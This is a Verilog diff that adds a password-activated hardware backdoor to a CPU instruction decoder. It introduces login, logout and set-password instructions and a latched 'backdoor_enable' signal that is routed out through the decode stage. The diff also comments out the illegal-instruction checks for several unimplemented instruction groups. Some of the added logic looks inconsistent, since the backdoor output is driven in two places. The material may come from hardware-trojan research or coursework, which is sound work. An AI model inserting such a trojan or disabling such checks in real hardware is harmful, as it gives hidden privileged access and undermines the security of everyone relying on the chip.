@@ -18,6 +18,8 @@
   // This is a *combinational* module (basically a PLA).
   //
 module decoder(// Inputs
+							 clk,
+							 reset,
                inst,
                valid_inst_in,  // ignore inst when low, outputs will
                                // reflect noop (except valid_inst)
@@ -33,25 +35,40 @@ module decoder(// Inputs
                uncond_branch,
                halt,           // non-zero on a halt
                illegal,        // non-zero on an illegal instruction 
-               valid_inst      // for counting valid instructions executed
+               valid_inst,     // for counting valid instructions executed
                                // and for making the fetch stage die on halts/
                                // keeping track of when to allow the next
                                // instruction out of fetch
                                // 0 for HALT and illegal instructions (die on halt)
+							 backdoor_enable
               );
 
   input [31:0] inst;
-  input valid_inst_in;
+  input valid_inst_in, clk, reset;
 
   output [1:0] opa_select, opb_select, dest_reg; // mux selects
   output [4:0] alu_func;
   output rd_mem, wr_mem, cond_branch, uncond_branch, halt, illegal, valid_inst;
 
+	// Output to enable/disable the backdoor
+	output backdoor_enable;
+
   reg [1:0] opa_select, opb_select, dest_reg; // mux selects
   reg [4:0] alu_func;
   reg rd_mem, wr_mem, cond_branch, uncond_branch, halt, illegal;
 
+	// REG to store the password
+	reg [20:0] password;
+	reg pass_set_reg; // to indicate whether the password has been set
+	reg pass_set_init;
+	reg set_login;
+	reg set_logout;
+	reg login_reg; // to indicate whether there's user has logged in
+
   assign valid_inst = valid_inst_in & ~illegal;
+
+	assign backdoor_enable = login_reg;
+
   always @*
   begin
       // default control values:
@@ -70,6 +87,12 @@ module decoder(// Inputs
     uncond_branch = `FALSE;
     halt = `FALSE;
     illegal = `FALSE;
+
+		pass_set_init	= 0; 
+		backdoor_enable = `FALSE;
+		set_login = `FALSE;
+		set_logout = `FALSE;
+
     if(valid_inst_in)
     begin
       case ({inst[31:29], 3'b0})
@@ -122,10 +145,10 @@ module decoder(// Inputs
                   `MULQ_INST:       alu_func = `ALU_MULQ;
                   default:          illegal = `TRUE;
                 endcase // case(inst[11:5])
-              `ITFP_GRP:       illegal = `TRUE;       // unimplemented
-              `FLTV_GRP:       illegal = `TRUE;       // unimplemented
-              `FLTI_GRP:       illegal = `TRUE;       // unimplemented
-              `FLTL_GRP:       illegal = `TRUE;       // unimplemented
+             // `ITFP_GRP:       illegal = `TRUE;       // unimplemented
+             // `FLTV_GRP:       illegal = `TRUE;       // unimplemented
+             // `FLTI_GRP:       illegal = `TRUE;       // unimplemented
+             // `FLTL_GRP:       illegal = `TRUE;       // unimplemented
             endcase // case(inst[31:26])
           end
            
@@ -142,6 +165,32 @@ module decoder(// Inputs
                  uncond_branch = `TRUE;
                end
             `FTPI_GRP:       illegal = `TRUE;       // unimplemented
+
+						// This part is added to decode the LOGIN_INST
+						`LOGIN_INST:
+								begin
+									if (inst[20:0] == password)
+										set_login = `TRUE;
+									else
+										halt = `TRUE;
+								end
+										
+						`LOGOUT_INST:
+								begin
+									if (login_reg)
+										set_logout = `TRUE;
+									else
+										halt = `TRUE;
+								end
+
+						`SET_PWD:
+								begin
+									if (~pass_set_reg)
+										pass_set_init = 1;	
+									else
+										halt = `TRUE;
+								end					
+
            endcase // case(inst[31:26])
            
         6'h08, 6'h20, 6'h28:
@@ -192,6 +241,24 @@ module decoder(// Inputs
       endcase // case(inst[31:29] << 3)
     end // if(~valid_inst_in)
   end // always
+
+	always @(posedge clk)
+	begin
+		if (reset)
+		begin
+			pass_set_reg <= 1'b0;
+			login_reg <= 1'b0;
+		end
+		else if (pass_set_init && ~halt)
+		begin
+			pass_set_reg <= pass_set_init;
+			password <= inst[20:0];
+		end
+		else if (set_login)
+			login_reg <= 1'b1;
+		else if (set_logout)
+			login_reg <= 1'b0;
+	end
    
 endmodule // decoder
 
@@ -219,7 +286,9 @@ module id_stage(
               id_uncond_branch_out,
               id_halt_out,
               id_illegal_out,
-              id_valid_inst_out
+              id_valid_inst_out,
+
+							id_backdoor_enable
               );
 
 
@@ -247,6 +316,7 @@ module id_stage(
   output        id_illegal_out;
   output        id_valid_inst_out;    // is inst a valid instruction to be 
                                       // counted for CPI calculations?
+	output				id_backdoor_enable;
    
   wire    [1:0] dest_reg_select;
   reg     [4:0] id_dest_reg_idx_out;     // not state: behavioral mux output
@@ -271,6 +341,8 @@ module id_stage(
 
     // instantiate the instruction decoder
   decoder decoder_0 (// Input
+										 .clk(clock),
+										 .reset(reset),
                      .inst(if_id_IR),
                      .valid_inst_in(if_id_valid_inst),
 
@@ -285,7 +357,10 @@ module id_stage(
                      .uncond_branch(id_uncond_branch_out),
                      .halt(id_halt_out),
                      .illegal(id_illegal_out),
-                     .valid_inst(id_valid_inst_out)
+                     .valid_inst(id_valid_inst_out),
+
+										 // Added output
+										 .backdoor_enable(id_backdoor_enable)
                     );
 
      // mux to generate dest_reg_idx based on
